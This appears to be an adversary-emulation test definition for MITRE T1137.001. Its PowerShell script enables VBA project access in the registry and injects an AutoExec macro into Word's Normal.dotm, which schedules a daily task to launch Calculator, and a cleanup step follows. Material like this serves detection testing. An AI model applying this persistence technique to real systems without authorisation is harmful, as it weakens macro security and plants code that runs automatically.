api_version: "2.0"
name: Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell
description: |
    Injects a Macro in the Word default template "Normal.dotm" and makes it execute each time that Word is opened. In this test, the Macro creates a sheduled task to open Calc.exe every evening.
uuid: 940db09e-80b6-4dd0-8d4d-7764f89b47a8
mitre:
    tactics:
        - 'TA0003: Persistence'
    techniques:
        - 'T1137: Office Application Startup'
    subtechniques:
        - 'T1137.001: Office Template Macros'
requirements:
    platforms:
        - os: windows
steps:
    - name: injecting-a-macro-into-the-word-normal.dotm-template-for-persistence-via-powershell
      inline: "# Registry setting to \"Trust access to the VBA project object model\" in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\n$registryValue = \"AccessVBOM\"\n$registryData = \"1\"\n# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Get the value of the Key/Value pair\n$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue\n# Logical operation to: if the value of the key/value is 1, do nothing - \n# if the value is 0, change it to 1 and create flag1 - \n# if it doesn't exist, create the value and flag2\nif ($value -eq \"1\") \n{\n  Write-Host \"The registry value '$registryValue' already exists with the required setting.\"\n}   \n  elseif ($value -eq \"0\") \n{\n  Write-Host \"The registry value was set to 0, temporarily changing to 1.\"\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\n  echo \"flag1\" > $flagPath1\n} \n  else \n{\n  Write-Host \"The registry value '$registryValue' does not exist, temporarily creating it.\"\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null\n  echo \"flag2\" > $flagPath2\n}\nAdd-Type -AssemblyName Microsoft.Office.Interop.Word\n# Define the path of copied normal template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n# Create copy of orginal template for restoral\nCopy-Item -Path $docPath -Destination $copyPath -Force\n# VBA code to be insterted as a Macro\n# Will create a scheduled task to open the Calculator at 8:04pm daily\n$vbaCode = @\"\n  Sub AutoExec()\n  Dim applicationPath As String\n  Dim taskName As String\n  Dim runTime As String\n  Dim schTasksCmd As String\n  applicationPath = \"C:\\Windows\\System32\\calc.exe\"\n  taskName = \"OpenCalcTask\"\n  runTime = \"20:04\"\n  schTasksCmd = \"schtasks /create /tn \"\"\" & taskName & \"\"\" /tr \"\"\" & applicationPath & \"\"\" /sc daily /st \" & runTime & \" /f\"\n  Shell \"cmd.exe /c \" & schTasksCmd, vbNormalFocus\n  End Sub\n\"@\n# Create a new instance of Word.Application\n$word = New-Object -ComObject Word.Application\n# Keep the Word application hidden\n$word.Visible = $false\n# Open the document\n$document = $word.Documents.Open($docPath)\n# Access the VBA project of the document\n$vbaProject = $document.VBProject\n# Add a new module to the VBA project\n$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule\n# Add the VBA code to the new module\n$newModule.CodeModule.AddFromString($vbaCode)\n# Run the Macro\n$word.run(\"AutoExec\")\n# Save and close the document\n$document.SaveAs($docPath)\n$document.Close()\n# Quit Word\n$word.Quit()\n# Release COM objects\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null\n[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null\n"
      executor: powershell
      cleanup:
        inline: "# Registry setting to \"Trust access to the VBA project object model\" in Word\n$registryKey = \"HKCU:Software\\Microsoft\\Office\\16.0\\Word\\Security\"\n$registryValue = \"AccessVBOM\"\n$registryData1 = \"1\"\n$registryData0 = \"0\"\n# Defines the path each flag file created depending on the original registry state\n$flagPath1 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag1.txt\"\n$flagPath2 = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\T1137-001_Flag2.txt\"\n# Define the path of copied normal template for restoral\n$copyPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal1.dotm\"\n# Define the path to the normal template\n$docPath = \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\"\n# Delete the scheduled task created by the Macro\nschtasks /Delete /TN \"OpenCalcTask\" /F | Out-Null\n#Restore the orginal template if the backup copy exists\nif (Test-Path $copyPath)\n{\n  #Delete the injected template\n  Remove-Item -Force $docPath -ErrorAction SilentlyContinue\n  # Restore the original template\n  Rename-Item -Force -Path $copyPath -NewName $docPath -ErrorAction SilentlyContinue\n  Write-Host \"The original template has been restored\"\n}\n  else\n{\n  Write-Host \"The original template is present\"\n}\n#Restore the original state of the registry key\nif (Test-Path $flagPath1) \n{\n  # The value was originally 0, set back to 0\n  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData0 -PropertyType DWORD -Force | Out-Null\n  Remove-Item -Force $flagPath1 -ErrorAction SilentlyContinue\n  Write-Host \"The original registry state has been restored\"\n} \n  elseif (Test-Path $flagPath2)\n{\n  #The value did not previously exist, delete the value\n  Remove-ItemProperty -Path $registryKey -Name $registryValue | Out-Null\n  Remove-Item -Force $flagPath2 -ErrorAction SilentlyContinue | Out-Null\n  Write-Host \"The original registry state has been restored\"\n}\n  else \n{\n  # The value was already 1, do nothing\n  Write-Host \"The value $registryValue already existed in $registryKey.\"\n}\n"
        executor: powershell
